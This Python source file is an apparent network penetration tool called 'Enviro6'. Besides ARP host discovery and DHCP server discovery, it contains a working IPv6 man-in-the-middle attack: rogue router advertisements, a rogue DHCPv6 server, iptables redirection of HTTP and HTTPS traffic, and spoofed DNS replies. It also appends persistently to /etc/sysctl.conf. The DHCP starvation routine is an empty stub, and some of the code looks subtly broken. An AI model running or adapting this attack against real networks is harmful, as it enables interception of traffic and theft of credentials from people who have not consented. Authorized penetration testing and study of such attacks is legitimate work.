import argparse
import scapy.all as scapy
import socket
import subprocess
import time
from netaddr import IPNetwork
import tempfile
from termcolor import colored, cprint

verbose = False

def log(message):
    if verbose:
        print(message)

def print_banner():
    banner = """
\033[38;5;208m
  ______            _             __  
 |  ____|          (_)           / /  
 | |__   _ ____   ___ _ __ ___  / /_  
 |  __| | '_ \ \ / / | '__/ _ \| '_ \ 
 | |____| | | \ V /| | | | (_) | (_) |
 |______|_| |_|\_/ |_|_|  \___/ \___/ 
                                      
                                      
Enviro6 - Penetration Tools for your Network,
6 is better than 4..
by @Shaked Wiessman
\033[0m"""
    cprint(banner, 'yellow')

def enable_ipv6_forwarding():
    log("Enabling IPv6 forwarding...")
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.forwarding=1"], check=True)
    with open('/etc/sysctl.conf', 'a') as sysctl_file:
        sysctl_file.write("\nnet.ipv6.conf.all.forwarding=1\n")
    subprocess.run(["sudo", "sysctl", "-p"], check=True)
    log("IPv6 forwarding enabled.")

def send_router_advertisement(iface, duration=60):
    log("Sending Router Advertisements (RA)...")
    ra = scapy.Ether(dst="33:33:00:00:00:01")/scapy.IPv6(src="fe80::1", dst="ff02::1")/scapy.ICMPv6ND_RA(routerlifetime=1800, M=1, O=1)
    start_time = time.time()
    while time.time() - start_time < duration:
        scapy.sendp(ra, iface=iface, verbose=True)
        time.sleep(1)
    log("Router Advertisements sent.")

def check_hosts(ip_range, iface):
    log("Checking all host names in the environment...")
    log(f"IP range: {ip_range}")
    
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    log("Sending ARP requests...")
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, iface=iface, verbose=True)[0]
    
    hosts = []
    for element in answered_list:
        hosts.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
    
    if not hosts:
        log("No hosts found.")
        cprint("No hosts found.", 'red')
    else:
        cprint(f"{'Host':<20}{'IP':<20}{'MAC':<20}", 'blue')
        cprint("="*60, 'blue')
        for host in hosts:
            try:
                hostname = socket.gethostbyaddr(host['ip'])[0]
            except socket.herror:
                hostname = "Unknown"
            cprint(f"{hostname:<20}{host['ip']:<20}{host['mac']:<20}", 'yellow')
    
    return hosts

def check_dhcp_servers(ip_range, iface):
    log("Checking for DHCP servers in the environment...")
    
    # Construct a DHCPDISCOVER packet
    dhcp_discover = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.IP(src="0.0.0.0", dst="255.255.255.255")/scapy.UDP(sport=68, dport=67)/scapy.BOOTP(chaddr=scapy.get_if_hwaddr(iface))/scapy.DHCP(options=[("message-type", "discover"), ("end")])

    # Send the packet multiple times to ensure it is received
    for _ in range(3):
        scapy.sendp(dhcp_discover, iface=iface, verbose=True)

    # Sniff for responses
    dhcp_offers = scapy.sniff(iface=iface, filter="udp and (port 67 or port 68)", timeout=10)

    dhcp_servers = set()
    for pkt in dhcp_offers:
        if pkt.haslayer(scapy.DHCP) and pkt[scapy.DHCP].options[0][1] == 2:  # DHCP Offer
            for option in pkt[scapy.DHCP].options:
                if option[0] == 'server_id':
                    dhcp_server_ip = option[1]
                    dhcp_servers.add(dhcp_server_ip)
    
    if dhcp_servers:
        cprint(f"{'DHCP Server IP':<20}", 'blue')
        cprint("="*20, 'blue')
        for server in dhcp_servers:
            cprint(f"{server:<20}", 'yellow')
    else:
        cprint("No DHCP servers found.", 'red')

def dhcp_starvation_attack(ip_range, iface):
    log("Performing DHCP starvation attack...")
    # Implement the DHCP starvation attack logic
    # This can be complex and involves crafting DHCP requests with random MAC addresses

def assign_ipv6_addresses(ip_range, iface):
    configure_dhcpv6(iface)
    time.sleep(10)  # Wait for DHCPv6 assignments to complete
    
    hosts = check_hosts(ip_range, iface)
    if hosts:
        for host in hosts:
            log(f"Attempting to retrieve IPv6 address for host {host['ip']}")
            ipv6_address = get_actual_ipv6_address(host['ip'], iface, host['mac'])
            cprint(f"Host: {host['ip']}, IPv6: {ipv6_address}", 'yellow')
    else:
        cprint("No hosts found to assign IPv6 addresses.", 'red')
    
    stop_dhcpv6()

def get_actual_ipv6_address(ip, iface, mac):
    log(f"Capturing DHCPv6 packets on {iface} to determine the IPv6 address assigned to {mac}")
    filter_str = f"udp and port 547 and ether src {mac}"
    try:
        packets = scapy.sniff(filter=filter_str, iface=iface, timeout=20)
        for packet in packets:
            if packet.haslayer(scapy.DHCP6_Advertise):
                ipv6_address = packet[scapy.DHCP6_Advertise].iaaddr
                return ipv6_address
    except Exception as e:
        log(f"Error capturing DHCPv6 packets for {ip}: {e}")
    return "unknown"

def configure_dhcpv6(iface):
    log("Configuring DHCPv6 server...")
    ipv6_address = get_iface_ipv6(iface)
    if ipv6_address:
        # Stop any existing dnsmasq instances
        log("Stopping any existing dnsmasq instances...")
        subprocess.run(["sudo", "pkill", "dnsmasq"], check=True)
        
        dhcpv6_config = f"""
port=0
interface={iface}
dhcp-range=::1000,::2000,constructor:{iface},ra-names,slaac
dhcp-option=option6:dns-server,{ipv6_address}
"""
        config_file = tempfile.NamedTemporaryFile(delete=False, mode='w')
        config_file.write(dhcpv6_config)
        config_file.flush()
        
        # Start dnsmasq with the DHCPv6 configuration
        log("Starting DHCPv6 server...")
        subprocess.run(["sudo", "dnsmasq", "-C", config_file.name], check=True)
        log("DHCPv6 server started.")
    else:
        log(f"No global IPv6 address found for interface {iface}. DHCPv6 server configuration aborted.")
        cprint(f"No global IPv6 address found for interface {iface}. DHCPv6 server configuration aborted.", 'red')

def stop_dhcpv6():
    log("Stopping DHCPv6 server...")
    subprocess.run(["sudo", "pkill", "dnsmasq"], check=True)
    log("DHCPv6 server stopped.")

def get_iface_ipv6(iface):
    log(f"Retrieving IPv6 address for interface {iface}...")
    result = subprocess.run(
        ["ip", "-6", "addr", "show", iface],
        capture_output=True,
        text=True
    )
    output = result.stdout
    for line in output.split("\n"):
        if "inet6" in line and "scope global" in line:
            ipv6_address = line.split()[1].split("/")[0]
            log(f"IPv6 address for {iface}: {ipv6_address}")
            return ipv6_address
    return None

def setup_mitm(iface):
    log("Setting up MITM...")
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8080"], check=True)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", iface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "8080"], check=True)
    log("MITM setup complete.")

def setup_fake_dns(iface, ipv6_address):
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    sock.bind((ipv6_address, 53))
    sock.setblocking(0)
    
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fulladdr = get_iface_ipv4(iface)
    addrinfo = socket.getaddrinfo(fulladdr, 53, socket.AF_INET, socket.SOCK_DGRAM)
    sock2.bind(addrinfo[0][4])
    sock2.setblocking(0)
    
    return sock, sock2

def get_iface_ipv4(iface):
    log(f"Retrieving IPv4 address for interface {iface}...")
    result = subprocess.run(
        ["ip", "addr", "show", iface],
        capture_output=True,
        text=True
    )
    output = result.stdout
    for line in output.split("\n"):
        if "inet" in line and "scope global" in line:
            ipv4_address = line.split()[1].split("/")[0]
            log(f"IPv4 address for {iface}: {ipv4_address}")
            return ipv4_address
    return None

def send_dns_reply(p, config):
    if scapy.IPv6 in p:
        ip = p[scapy.IPv6]
        resp = scapy.Ether(dst=p.src, src=p.dst)/scapy.IPv6(dst=ip.src, src=ip.dst)/scapy.UDP(dport=ip.sport, sport=ip.dport)
    else:
        ip = p[scapy.IP]
        resp = scapy.Ether(dst=p.src, src=p.dst)/scapy.IP(dst=ip.src, src=ip.dst)/scapy.UDP(dport=ip.sport, sport=ip.dport)
    dns = p[scapy.DNS]
    if dns.qd.qclass != 1 or dns.qr != 0:
        return
    reqname = dns.qd.qname.decode()
    if dns.qd.qtype == 1:
        rdata = config['ipv4_address']
    elif dns.qd.qtype == 28:
        rdata = config['ipv6_address']
    else:
        return
    resp /= scapy.DNS(id=dns.id, qr=1, qd=dns.qd, an=scapy.DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata, type=dns.qd.qtype))
    try:
        scapy.sendp(resp, iface=config['iface'], verbose=False)
    except socket.error as e:
        log('Error sending spoofed DNS')
        log(e)
        if verbose:
            scapy.ls(resp)
    log(f'Sent spoofed reply for {reqname} to {ip.src}')

def parse_packet(p, config):
    if scapy.DHCP6_Solicit in p:
        log(f"Received DHCPv6 Solicit from {p.src}")
        # Handle DHCPv6 solicit
    if scapy.DHCP6_Request in p:
        log(f"Received DHCPv6 Request from {p.src}")
        # Handle DHCPv6 request
    if scapy.DNS in p:
        if p.dst == config['mac_address']:
            send_dns_reply(p, config)

def main():
    global verbose
    parser = argparse.ArgumentParser(description='Network Pretesting Tool')
    parser.add_argument('-ip_range', type=str, required=True, help='IP range to scan')
    parser.add_argument('-iface', type=str, required=True, help='Network interface to use for scanning')
    parser.add_argument('-HostChecker', action='store_true', help='Check all host names in the environment')
    parser.add_argument('-DHCPCheck', action='store_true', help='Check all DHCP servers in the environment')
    parser.add_argument('-Take4', action='store_true', help='Perform DHCP starvation attack')
    parser.add_argument('-Send6', action='store_true', help='Assign IPv6 addresses to hosts and display them')
    parser.add_argument('-verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        global verbose
        verbose = True
    
    print_banner()
    
    if args.HostChecker:
        check_hosts(args.ip_range, args.iface)
    if args.DHCPCheck:
        check_dhcp_servers(args.ip_range, args.iface)
    if args.Take4:
        dhcp_starvation_attack(args.ip_range, args.iface)
    if args.Send6:
        enable_ipv6_forwarding()
        setup_mitm(args.iface)
        ipv6_address = get_iface_ipv6(args.iface)
        if ipv6_address is None:
            cprint(f"No global IPv6 address found for interface {args.iface}. DHCPv6 server configuration aborted.", 'red')
            return
        send_router_advertisement(args.iface, duration=10)  # Send RA for 10 seconds
        configure_dhcpv6(args.iface)
        sock, sock2 = setup_fake_dns(args.iface, ipv6_address)
        config = {
            'ipv4_address': get_iface_ipv4(args.iface),
            'ipv6_address': ipv6_address,
            'mac_address': scapy.get_if_hwaddr(args.iface),
            'iface': args.iface
        }
        log(f"Starting packet sniffing on interface {args.iface}")
        scapy.sniff(iface=args.iface, filter="ip6 proto \\udp or arp or udp port 53", prn=lambda p: parse_packet(p, config))

if __name__ == "__main__":
    main()
